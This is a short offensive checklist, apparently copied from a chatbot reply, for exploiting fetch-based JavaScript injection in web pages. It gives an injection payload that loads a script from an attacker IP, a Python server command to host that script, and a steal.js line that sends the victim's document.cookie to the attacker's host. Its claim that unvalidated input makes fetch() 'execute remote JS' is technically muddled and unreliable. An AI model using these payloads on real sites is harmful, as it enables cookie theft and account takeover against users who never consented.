📋 TODO - JS Fetch Injection Exploitation
🔍 1. Recon the JavaScript Files
 Open Developer Tools → Go to Network tab → Refresh page.

 Filter by JS and inspect all JavaScript files.

 Locate fetch() or XMLHttpRequest() instances in loaded JS files.

🔧 Goal: Identify dynamic API endpoints fetching data that could be influenced.

🔓 2. Search for Unsanitized Fetch URLs
 Ctrl+F in minified JS to locate lines like:

js
Copy code
fetch('/api/resource?id=' + userInput)
🔍 Check if userInput is controllable via URL params or form data.

🧠 Strategy: Tampering unsanitized fetch input can lead to injection or path traversal.

🧪 3. Manipulate with Payload
 Inject malicious payload via browser URL or intercepted request:

bash
Copy code
/#/search?q=';fetch("http://<attacker-ip>/steal.js")
🛠️ Use Burp Suite to intercept and modify payloads.

🛡️ Back-End Tech: If input is not validated or encoded, fetch() will execute remote JS.

🔎 4. Host Malicious JS
 Use a Python HTTP server to host:

bash
Copy code
python3 -m http.server 8000
📄 steal.js may contain:

js
Copy code
fetch('http://attacker-ip/steal?cookie=' + document.cookie)
📦 5. Check Response for Execution
 Monitor terminal or web server logs.

🧠 Goal: If fetch executes, you’ll see incoming GETs to /steal?cookie=....

🧼 6. Verify Exploitation & Cleanup
 Confirm execution of injected JS.

 Clean up any hosted malicious files.
